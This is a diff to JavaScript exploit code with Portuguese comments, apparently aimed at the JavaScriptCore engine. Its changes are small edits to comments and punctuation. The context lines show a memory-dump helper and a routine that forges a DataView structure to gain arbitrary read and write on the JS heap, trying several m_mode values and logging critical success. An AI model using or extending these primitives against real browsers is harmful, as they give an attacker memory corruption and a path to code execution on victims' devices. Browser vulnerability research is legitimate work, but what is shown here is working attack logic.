@@ -50,7 +50,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
     logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
     const bytesPerRow = 16;
     for (let i = 0; i < size; i += bytesPerRow) {
-        // CORREÇÃO AQUI: 'j' não estava no escopo, use apenas 'i' para o início da linha.
+        // CORREÇÃO ANTERIOR APLICADA: 'j' não estava no escopo, use apenas 'i' para o início da linha.
         let hexLine = address.add(i).toString(16).padStart(2, '0') + " ";
         let asciiLine = "  ";
         let rowBytes = [];
@@ -168,7 +168,7 @@ function _int64ToDouble_direct(int64) {
  * @param {AdvancedInt64} dataViewStructureVtableAddress O endereço do vtable da DataView Structure.
  * @param {number} m_mode_to_try O valor de m_mode a ser testado.
  * @returns {boolean} True se a primitiva foi configurada e testada com sucesso com este m_mode.
- */
+*/
 async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureVtableAddress, m_mode_to_try) {
     const FNAME = "attemptUniversalArbitraryReadWriteWithMMode";
     logFn(`[${FNAME}] Tentando configurar L/E Arbitrária Universal com m_mode: ${toHex(m_mode_to_try)}...`, "subtest", FNAME);
@@ -217,7 +217,7 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
         const read_back_from_fake_dv = await arb_read_universal_js_heap(test_target_js_object_addr, 4, logFn);
 
         if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
-            logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
+            logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode: ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
             // IMPORTANTE: Restaurar o valor original do m_vector do DataView forjado para zero ou um valor seguro.
             // A arb_read/write_universal_js_heap já faz isso, mas uma garantia extra é boa.
             return true;
@@ -236,7 +236,7 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
             if (index > -1) { hold_objects.splice(index, 1); }
         }
         _fake_data_view = null;
-    }
+    }; // <-- PONTO E VÍRGULA ADICIONADO AQUI
 }
 
 
